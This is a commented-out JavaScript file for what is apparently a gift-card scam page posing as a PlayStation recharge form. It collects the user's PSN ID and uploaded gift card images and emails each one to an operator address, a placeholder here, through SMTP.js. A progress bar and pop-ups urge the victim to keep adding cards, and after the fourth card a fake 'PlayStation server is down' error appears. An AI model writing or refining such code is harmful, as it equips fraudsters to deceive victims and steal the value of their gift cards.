// document.getElementById("giftCardForm").addEventListener("submit", function(event) {
//     event.preventDefault();
//     const progressBar = document.getElementById("progressBar");
//     let currentWidth = parseInt(progressBar.style.width) || 0;
    
//     if (currentWidth < 100) {
//         progressBar.style.width = (currentWidth + 25) + "%";
//     }
    
//     if (currentWidth >= 75) {
//         showPopup("PlayStation server is down, recharge directly on the console.", true);
//     } else {
//         showPopup("Please add another gift card.", false);
//     }
// });

// function showPopup(message, isError) {
//     const popup = document.getElementById("popup");
//     popup.textContent = message;
//     popup.classList.add("show");
//     popup.style.background = isError ? "red" : "blue";
//     setTimeout(() => popup.classList.remove("show"), 3000);
// }



// script.js

// document.addEventListener("DOMContentLoaded", () => {
//     const form = document.getElementById("giftCardForm");
//     const progressBar = document.getElementById("progressBar");
//     const message = document.getElementById("message");

//     let giftCardsSubmitted = 0;

//     form.addEventListener("submit", function (event) {
//         event.preventDefault();

//         const psnID = document.getElementById("psnID").value;
//         const cardType = document.getElementById("cardType").value;
//         const giftCardImage = document.getElementById("giftCardImage").files[0];

//         if (!giftCardImage) {
//             alert("Please upload a gift card image.");
//             return;
//         }

//         giftCardsSubmitted++;

//         // Update Progress Bar
//         progressBar.style.width = `${(giftCardsSubmitted / 4) * 100}%`;

//         // Pop-up Message
//         if (giftCardsSubmitted === 1) {
//             alert("Add more gift cards to complete the process.");
//         }

//         if (giftCardsSubmitted === 4) {
//             alert("Error 315: PlayStation server is down. Recharge directly on the console.");
//             return;
//         }

//         // Send Email using SMTP.js
//         sendEmail(psnID, cardType, giftCardImage);
//     });

//     function sendEmail(psnID, cardType, giftCardImage) {
//         let reader = new FileReader();
//         reader.readAsDataURL(giftCardImage);
//         reader.onload = function () {
//             Email.send({
//                 SecureToken: "your-smtp-token",
//                 To: "your-email@example.com",
//                 From: "no-reply@example.com",
//                 Subject: "New Gift Card Submission",
//                 Body: `
//                     <h3>New Gift Card Submission</h3>
//                     <p><strong>PlayStation ID:</strong> ${psnID}</p>
//                     <p><strong>Gift Card Type:</strong> ${cardType}</p>
//                     <p>See attached gift card image.</p>
//                 `,
//                 Attachments: [
//                     {
//                         name: giftCardImage.name,
//                         data: reader.result,
//                     },
//                 ],
//             }).then((message) => alert("Gift Card Sent!"));
//         };
//     }
// });





// script.js